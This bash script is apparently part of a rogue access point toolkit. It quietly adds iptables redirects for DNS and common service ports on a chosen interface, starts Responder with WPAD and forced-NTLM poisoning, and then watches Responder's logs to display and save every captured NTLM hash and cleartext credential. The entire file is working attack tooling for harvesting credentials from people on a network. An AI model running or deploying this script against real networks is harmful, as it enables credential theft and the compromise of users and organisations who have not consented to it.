#!/bin/bash
# Args: $1=iface
# Env:  KARMA_OUT

IFACE="$1"
OUT="${KARMA_OUT:-$(dirname "$0")/..}"
mkdir -p "$OUT"

# Silently add iptables redirect rules
_ipt="$(iptables -t nat -vnL PREROUTING 2>/dev/null)"
echo "$_ipt" | grep -q "$IFACE.*53" 2>/dev/null || \
  iptables -t nat -A PREROUTING -i "$IFACE" -p udp --dport 53 -j REDIRECT --to-port 53 2>/dev/null
for _p in 21 25 80 88 110 143 389 443 445 1433 3389; do
  echo "$_ipt" | grep "$IFACE" | grep -q " $_p" 2>/dev/null || \
    iptables -t nat -A PREROUTING -i "$IFACE" -p tcp --dport "$_p" -j REDIRECT --to-port "$_p" 2>/dev/null
done

if [[ -z "$(pgrep -f Responder.py 2>/dev/null)" ]]; then
  responder -I "$IFACE" -wF > "$OUT/responder.log" 2>&1 &
  STATUS="\033[1;32mSTARTED\033[0m"
else
  STATUS="\033[1;33mALREADY RUNNING\033[0m"
fi

printf '\n\033[1;33m  ┌── RESPONDER ─────────────────────────────────┐\033[0m\n'
printf '\033[1;33m  │\033[0m  %-8s  WPAD+ForceNTLM  poisoning 10 ports \033[1;33m│\033[0m\n' "$IFACE"
printf '\033[1;33m  │\033[0m  Status : '"$STATUS"'%*s\033[1;33m│\033[0m\n' 25 ''
printf '\033[1;33m  └─────────────────────────────────────────────────\033[0m\n\n'

# Watch for new hash lines in Responder log files.
# Filter: only show lines matching actual NTLM (Username::Domain:hex:) or ClearText format.
# This prevents false positives from Responder's analyzer/session info logs.
if command -v inotifywait &>/dev/null && [ -d /usr/share/responder/logs ]; then
  inotifywait -e MODIFY -rm /usr/share/responder/logs 2>/dev/null | \
  while read -r _dir _evt _file; do
    sleep 0.1  # let responder finish writing the line
    _hash="$(tail -1 "/usr/share/responder/logs/$_file" 2>/dev/null)"
    [[ -z "$_hash" ]] && continue
    # NTLM format: Username::Domain:ServerChallenge(hex):NTHash(hex):Blob
    # ClearText format: contains "ClearText" keyword
    echo "$_hash" | grep -qE '::[^:]+:[0-9A-Fa-f]{8,}:|ClearText' || continue
    printf '\n\033[1;31m  ╔══ HASH CAPTURED ══════════════════════════════╗\033[0m\n'
    printf '\033[1;31m  ║  \033[1;37m%s\033[0m\n' "$_hash"
    printf '\033[1;31m  ╚═══════════════════════════════════════════════╝\033[0m\n\n'
    echo "$_hash" >> "$OUT/responder_hashes.txt"
  done
fi
